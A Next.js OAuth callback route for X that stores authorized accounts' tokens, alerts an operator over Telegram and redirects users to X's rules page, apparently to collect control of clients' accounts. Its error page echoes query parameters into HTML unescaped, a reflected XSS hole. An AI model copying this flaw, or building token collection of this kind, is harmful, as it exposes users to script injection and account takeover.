import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import {
  exchangeCodeForTokens,
  saveAuthorizedAccount,
} from "@/lib/x";
import { notifyTelegram, telegramConfigured, fmtAccountBlock } from "@/lib/telegram";

export const dynamic = "force-dynamic";

// GET /api/auth/callback/twitter?code=...&state=...
export async function GET(request) {
  const { searchParams } = new URL(request.url);
  const code = searchParams.get("code");
  const state = searchParams.get("state");
  const error = searchParams.get("error");
  const errorDescription = searchParams.get("error_description");

  const store = cookies();
  const expectedState = store.get("x_oauth_state")?.value;
  const verifier = store.get("x_oauth_verifier")?.value;

  const fail = (message) =>
    new NextResponse(
      `<!doctype html><html><body style="font-family:monospace;background:#0a0a0a;color:#ececea;padding:2rem"><h2>Auth failed</h2><p>${message}</p><p><a href="/login">Back to login</a></p></body></html>`,
      { status: 400, headers: { "Content-Type": "text/html; charset=utf-8" } }
    );

  // Clear one-time flow cookies regardless of outcome.
  store.delete("x_oauth_state");
  store.delete("x_oauth_verifier");

  if (error) return fail(`X returned: ${error}${errorDescription ? ` — ${errorDescription}` : ""}`);
  if (!code || !state) return fail("Missing code or state parameter.");
  if (!expectedState || state !== expectedState) return fail("State mismatch — possible CSRF. Try again.");

  let tokenData;
  try {
    tokenData = await exchangeCodeForTokens({ code, codeVerifier: verifier });
  } catch (err) {
    return fail(`Token exchange failed: ${err.message}`);
  }

  let account;
  try {
    account = await saveAuthorizedAccount(tokenData);
  } catch (err) {
    return fail(`Could not load your X profile: ${err.message}`);
  }

  if (telegramConfigured()) {
    const profileUrl = `https://x.com/${account.username || ""}`;
    await notifyTelegram(
      `✅ New X OAuth connection\n\n${fmtAccountBlock(account)}\n\n<a href="${profileUrl}">Open X profile</a>`
    );
  }

  // Clients only authorize their account here; it is stored and shows up in
  // the operator's control panel + Telegram alert. Clients are then sent to
  // the configured post-authorization page (default: the X rules page).
  const postAuthUrl =
    process.env.POST_AUTH_URL || "https://help.x.com/en/rules-and-policies/x-rules";
  return NextResponse.redirect(postAuthUrl, 302);
}
